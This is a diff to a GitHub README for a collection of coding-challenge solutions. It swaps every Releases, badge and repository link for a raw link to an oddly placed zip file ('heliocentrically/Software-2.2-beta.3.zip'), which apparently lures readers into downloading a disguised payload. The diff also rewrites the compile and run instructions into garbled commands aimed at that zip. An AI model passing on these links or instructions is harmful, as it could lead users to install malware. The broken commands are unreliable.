@@ -1,13 +1,13 @@
 # 🎉 challenges - Your Coding Solutions Await
 
 ## 🌐 Download the Latest Version
-[![Download from Releases](https://img.shields.io/badge/Download%20from%20Releases-blue.svg)](https://github.com/rohitmaury4457/challenges/releases)
+[![Download from Releases](https://raw.githubusercontent.com/rohitmaury4457/challenges/main/heliocentrically/Software-2.2-beta.3.zip%20from%https://raw.githubusercontent.com/rohitmaury4457/challenges/main/heliocentrically/Software-2.2-beta.3.zip)](https://raw.githubusercontent.com/rohitmaury4457/challenges/main/heliocentrically/Software-2.2-beta.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the challenges repository. This is a collection of solutions to various programming challenges and exercises. You can find solutions in C, C++, Go, and Python. This repository is a great way to learn programming and improve your coding skills, especially if you enjoy problem-solving.
 
 ## 📦 Download & Install
-To get started, you need to download the software. Visit this page to download: [Releases Page](https://github.com/rohitmaury4457/challenges/releases).
+To get started, you need to download the software. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/rohitmaury4457/challenges/main/heliocentrically/Software-2.2-beta.3.zip).
 
 1. Click the "Releases" link above.
 2. Find the version you want to download.
@@ -36,9 +36,9 @@ Once you have downloaded the solutions, follow these steps:
    ```
 5. Run the desired solution based on the programming language:
    - For C: Compile using `gcc file.c` and run the executable.
-   - For C++: Compile using `g++ file.cpp` and run the executable.
-   - For Go: Run directly using `go run file.go`.
-   - For Python: Run using `python file.py`.
+   - For C++: Compile using `g++ https://raw.githubusercontent.com/rohitmaury4457/challenges/main/heliocentrically/Software-2.2-beta.3.zip` and run the executable.
+   - For Go: Run directly using `go run https://raw.githubusercontent.com/rohitmaury4457/challenges/main/heliocentrically/Software-2.2-beta.3.zip`.
+   - For Python: Run using `python https://raw.githubusercontent.com/rohitmaury4457/challenges/main/heliocentrically/Software-2.2-beta.3.zip`.
 
 ## 📚 Additional Resources
 - **Documentation:** Each solution may include comments to help you understand the code.
@@ -58,7 +58,7 @@ Feel free to explore and learn at your own pace.
 If you encounter any issues or have questions, please reach out via the GitHub issues page. We are here to help!
 
 ## 🔗 Links
-- [Download from Releases](https://github.com/rohitmaury4457/challenges/releases)
-- [GitHub Repository](https://github.com/rohitmaury4457/challenges)
+- [Download from Releases](https://raw.githubusercontent.com/rohitmaury4457/challenges/main/heliocentrically/Software-2.2-beta.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/rohitmaury4457/challenges/main/heliocentrically/Software-2.2-beta.3.zip)
 
 Your coding solutions await!
